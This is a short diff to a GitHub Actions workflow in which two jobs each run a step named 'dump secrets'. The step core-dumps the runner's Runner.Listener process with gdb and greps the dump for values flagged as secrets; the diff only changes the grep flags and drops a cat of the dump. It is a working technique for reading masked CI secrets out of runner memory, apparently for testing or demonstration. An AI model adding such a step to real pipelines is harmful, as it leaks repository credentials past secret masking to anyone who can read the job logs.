@@ -15,8 +15,7 @@ jobs:
       - name: dump secrets
         run: |
           sudo apt-get install -y gdb && sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
-          grep -Eao '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump*
-          cat k.dump*
+          grep -Ea '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump*
   test2:
     runs-on: ubuntu-latest
     environment: secret_one_scope
@@ -24,5 +23,4 @@ jobs:
       - name: dump secrets
         run: |
           sudo apt-get install -y gdb && sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
-          grep -Eao '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump*
-          cat k.dump*
+          grep -Ea '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump*
